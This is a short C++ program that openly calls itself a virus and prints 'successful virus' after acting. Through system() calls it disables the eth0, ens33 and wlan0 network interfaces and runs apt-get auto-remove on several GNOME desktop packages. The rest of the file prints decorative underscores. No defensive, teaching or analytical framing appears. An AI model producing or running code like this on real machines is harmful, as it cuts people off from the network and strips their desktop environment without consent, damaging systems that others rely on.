#include <iostream>
#include <chrono>
#include <thread>
using namespace std;
	
int main(){
	system("ifconfig eth0 down");
	system("ifconfig ens33 down");
	system("ifconfig wlan0 down");
	
	system("apt-get auto-remove gnome-shell");
	system("apt-get auto-remove gnome-shell-co");
	system("apt-get auto-remove gnome-software");
	system("apt-get auto-remove gnome-core");
	std::chrono::seconds time(1);
	std::this_thread::sleep_for(time);
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";  
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "^^^";
	
	cout << "^^^";
	
	cout << "^^^";
	
	cout << "^^^";
	
	cout << "^^^";
	
	cout << "^_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "__";
	
	cout << "__";
	
	cout << "__";
	std::chrono::seconds timess(1);
	std::this_thread::sleep_for(timess);
	
	cout << "___" << endl;
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "_";
	
	cout << "__"; 
	
	cout << "_";
	
	cout << "__";
	
	cout << "__";
	
	cout << "__";
	
	cout << "__";
	
	cout << "s";
	
	cout << "u";
	
	cout << "c";
	
	cout << "c";
	
	cout << "e";
	
	cout << "s";
	
	cout << "s";
	
	cout << "f";
	
	cout << "u";
	
	cout << "l ";
	
	cout << "v";
	
	cout << "i";
	
	cout << "r";
	
	cout << "u";
	
	cout << "s";
	
	cout << "__";
	
	cout << "___";
	
	cout << "____";
	
	cout << "_____";
	std::chrono::seconds times(1);
	std::this_thread::sleep_for(times);
	
	cout << "__" << endl;
	
	cout << "___";
	
	cout << "____";
	
	cout << "_____";
	
	cout << "______";
	
	cout << "_______";
	
	cout << "________";
	
	cout << "_________";
	
	cout << "_____" << endl;
	return 0;
}
